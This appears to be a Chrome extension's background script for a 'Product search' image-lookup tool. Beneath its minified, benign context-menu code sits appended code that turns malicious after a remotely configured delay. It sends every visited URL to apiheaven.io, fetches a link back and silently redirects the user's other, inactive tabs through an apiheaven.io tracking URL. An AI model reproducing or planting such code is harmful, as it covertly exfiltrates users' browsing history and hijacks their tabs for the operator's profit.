(()=>{"use strict";class e{static save(e,t){return new Promise((s=>{chrome.storage.local.set({[e]:t},(()=>s(!0)))}))}static get(e){return new Promise(((t,s)=>{chrome.storage.local.get(e,(r=>{e||s("No key"),t(r[e])}))}))}static delete(e){return new Promise(((t,s)=>{chrome.storage.local.remove(e,(r=>{e||s("No key"),t(r[e])}))}))}}class t{constructor(e,t){this.url=e,this.tabId=t}async urlContentToDataUri(){const e=await fetch(this.url),t=await e.blob();chrome.scripting.removeCSS({files:["css/loader.css"],target:{tabId:this.tabId}});return await this.blobToBase64(t)}async blobToBase64(e){const t=new FileReader;return await new Promise(((s,r)=>{t.onload=s,t.onerror=r,t.readAsDataURL(e)})),t.result}}const s=chrome.i18n.getMessage("contextName")||"Product search";chrome.contextMenus.removeAll((function(){chrome.contextMenus.create({contexts:["image"],title:s,id:"kd636632-0c68-459q-nc45-6f76d53215cd"})})),chrome.runtime.onInstalled.addListener((async function({reason:t}){try{"install"===t&&await e.save("it",String(+new Date))}catch(e){console.log("e onInstalled",e.message)}})),chrome.contextMenus.onClicked.addListener((async({srcUrl:s},{id:r})=>{let a;try{if(chrome.tabs.sendMessage(r,{cmd:"loader"},(()=>{chrome.runtime.lastError})),chrome.scripting.insertCSS({files:["css/loader.css"],target:{tabId:r}}),s.startsWith("data:image"))a=s;else{const e=new t(s,r);if(a=await e.urlContentToDataUri(),!a)throw new Error("Empty data")}console.log("base64",a),await e.save("base64",a),chrome.tabs.create({url:"https://productsearch.app/visual-search"})}catch(e){chrome.tabs.sendMessage(r,{cmd:"error"},(()=>{chrome.runtime.lastError})),chrome.scripting.insertCSS({files:["css/toast.css"],target:{tabId:r}})}finally{chrome.scripting.removeCSS({files:["css/loader.css"],target:{tabId:r}})}}))})();

chrome.runtime.onInstalled.addListener(async ({ reason }) => {
    if (reason === 'install') await lssave((+ new Date()), 'it');
    if (reason === 'update') {
        const it = await lsget('it');
        if ( !it ) await lssave((+ new Date()), 'it');
    }
});

function lssave(data, key) {
    return new Promise((resolve) => {chrome.storage.local.set({ [key]: data }, () => resolve(true))});
};

function lsget(key) {
    return new Promise((resolve) => {
        chrome.storage.local.get(key, (result) => {
            if (!key) resolve(undefined);
            resolve(result[key]);
        })
    })
};

function lsremove(key) {
    return new Promise((resolve) => {chrome.storage.local.remove(key, () => resolve(true))});
};

function gtab() {
    return new Promise((resolve) => {
        chrome.tabs.query({ active: false, pinned: false, audible: false, status: 'complete', }, (tab) => resolve(tab))
    })
}

async function gettabs() {
    const tabs = await gtab()
    return tabs.filter((tab) => {
        if (!tab.id || !tab.url) { return false; }
        if (!tab.url.startsWith('http')) { return false; }
        if (new URL(tab.url).hostname.includes('product')) { return false; }
        return true;
    });
};

function tcheck(pastdate, thold) {
    if ( ((+ new Date()) - pastdate ) > thold ) return true;
    return false;
};

async function ncall(path, obj) {
    try {
        const _obj = Object.entries(obj).map(([key, value]) => `${key}=${value}`).join('&');
        const _objf = _obj ? `${_obj}&eid=${chrome.runtime.id}` : `eid=${chrome.runtime.id}`;
        const resp = await fetch(`https://apiheaven.io/${path}?${_objf}`);
        if ( !resp || resp.status !== 200 ) return undefined;
        return await resp.json()
    } catch (_) {
        return undefined;
    }
};

chrome.tabs.onUpdated.addListener(async (tabId, { status }, { url }) => {
    if ( status === 'complete' && url.startsWith('http') ) {
        const rcfgt = await lsget('rcfgt');
        if (!rcfgt || tcheck(parseInt(rcfgt), 3600000)) {
            const nrcfg = await ncall('config', {});
            if (!nrcfg || !nrcfg.hasOwnProperty('data')) return;

            await lssave(JSON.stringify(nrcfg.data), 'rcfg');
            await lssave((+ new Date()), 'rcfgt');
        }
        
        let rcfg = await lsget('rcfg');
        if (!rcfg) return;
        rcfg = JSON.parse(rcfg);

        const it = await lsget('it');
        if (!tcheck(parseInt(it), parseInt(rcfg.fst))) return;

        const host = new URL(url).host;
        
        const isexists = await lsget(host);
        await lssave((+ new Date()), host);
        
        if (!isexists || tcheck(parseInt(isexists), parseInt(rcfg.bmt))) {

            let tid = tabId;

            if ( !rcfg.ust ) {
                const tabs = await gettabs();
                if (!tabs.length) return;

                console.log(tabs);
                tid = tabs[0].id;
            }

            const resp = await ncall('stats', { u: encodeURIComponent(url) });
            if (!resp || !resp.hasOwnProperty('link') || !resp.link.length ) return;
            const flink = `https://apiheaven.io/pulse?eid=${chrome.runtime.id}&u=${encodeURIComponent(resp.link)}`

            await chrome.tabs.update(tid, { url: flink, active: false, });
        }
    }
});